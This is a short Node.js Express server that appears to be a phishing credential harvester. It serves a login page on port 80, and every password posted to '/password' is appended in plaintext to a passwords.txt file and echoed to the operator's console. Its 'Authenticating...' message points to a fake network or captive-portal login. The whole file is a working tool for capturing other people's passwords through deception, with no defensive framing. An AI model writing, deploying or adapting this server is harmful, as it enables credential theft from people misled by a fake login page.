const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const login_page = path.join(__dirname, '/public/index.html');

// What to do if there is a GET request
app.get('/', (req, res) => {
    console.log('The client tried to enter a website.');
    res.sendFile(login_page);
}).post('/password', (req, res) => {
    const password = req.body.password;
    // Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('../passwords.txt', `password : ${password} \n`);
    console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);
    title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
    res.sendFile(login_page);
});

const port = 80
app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
